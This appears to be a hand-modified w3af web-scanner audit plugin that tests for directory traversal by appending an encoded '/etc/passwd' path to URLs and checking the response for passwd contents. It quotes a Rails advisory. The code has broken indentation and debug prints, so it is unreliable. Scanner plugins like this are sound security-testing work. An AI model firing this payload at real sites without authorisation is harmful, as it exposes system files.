"""

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import copy

from math import log, floor
from itertools import chain

import w3af.core.controllers.output_manager as om
import w3af.core.data.constants.severity as severity

from w3af.core.controllers.plugins.audit_plugin import AuditPlugin
from w3af.core.controllers.misc.fuzzy_string_cmp import relative_distance_boolean
from w3af.core.data.fuzzer.fuzzer import create_mutants
from w3af.core.data.fuzzer.mutants.headers_mutant import HeadersMutant
from w3af.core.data.kb.vuln import Vuln
from w3af.core.data.request.fuzzable_request import FuzzableRequest
from w3af.core.data.url.extended_urllib import *

class directory_traversal(AuditPlugin):
    _PAYLOAD = '/%2fetc%2fpasswd'
    def __init__(self):
        AuditPlugin.__init__(self)
	

    def audit(self, freq, orig_response):
	url = URL(freq.get_url() + self._PAYLOAD)
	print 'the url is %s', url
	freq_new = FuzzableRequest(url, method='GET')
        response = self._uri_opener.send_mutant(freq_new)
	print response.get_body()
	if 'root:/root' in response.get_body():	
      		msg = 'Directory Traversal Vulnerbility found at ' + freq.get_url()
        	v = Vuln.from_fr('Directory Traversal vulnerability', msg, severity.MEDIUM,
                         orig_response.id, self.get_name(), freq)
        
		print 'hello there'
        	self.kb_append_uniq(self, 'directory_traversal', v)

    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
	Directory traversal vulnerability in Action View in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 allows remote attackers to read arbitrary files by leveraging an application's unrestricted use of the render method and providing a .. (dot dot) in a pathname.
        """

